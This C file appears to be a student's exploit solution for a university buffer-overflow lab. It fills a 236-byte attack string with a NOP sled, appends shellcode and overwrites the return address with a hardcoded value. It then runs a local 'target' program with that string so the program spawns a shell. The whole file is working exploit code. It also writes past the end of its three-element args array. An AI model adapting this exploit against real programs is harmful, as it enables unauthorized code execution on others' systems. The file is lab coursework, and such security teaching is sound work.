#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

/**********************************************************
 Instructions
 ------------
 
 1. Make sure you type in your student number in the #define below.  You should format your student number as a string without spaces like this:
 
 #define STUDENT_NUMBER "989990924"
 
 It does not matter whether your student number is 9 or 10 digits.  
 
 2. Fill in the "attackString" variable with your attack string.  Your goal will be to execute the shellcode, which is the same as in the lab and spawn a shell.
 
 3. To submit your solution please upload your sploit.c file and *nothing* else.  Your entire solution should fit in your sploit.c file.
 ***********************************************************/



#define BUFFSIZE 236
#define TARGET "target"
#define STUDENT_NUMBER "1007350242"
#define NOP 0x90
int
main ( int argc, char * argv[] )
{
    char *args[3];
    char *env[1];
    char *attackString, *ptr;
    /* Allocate memory for our attack string. */
    if (!(attackString = malloc(BUFFSIZE))) {
        printf("Can't allocate memory :p\n");
        exit(0);
    }
    int i;
    for (i=0; i<BUFFSIZE; i++){
        attackString[i] = NOP;
    }

    ptr = attackString + BUFFSIZE - strlen(shellcode) - 4 ;
    for (i=0; i<strlen(shellcode); i++){
        *(ptr++) = shellcode[i];
    }
    //char * s = "0x44711db0";
    *(ptr ++) = 0xb0;
    *(ptr ++) = 0x1d;
    *(ptr ++) = 0x71;
    *(ptr ++) = 0x44;
    /* Call the target with our attack string. */
    args[0] = TARGET; args[1] = STUDENT_NUMBER; args[2] = attackString; args[3] = NULL;
    env[0] = NULL;
    
    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");
    
    return 0;
}
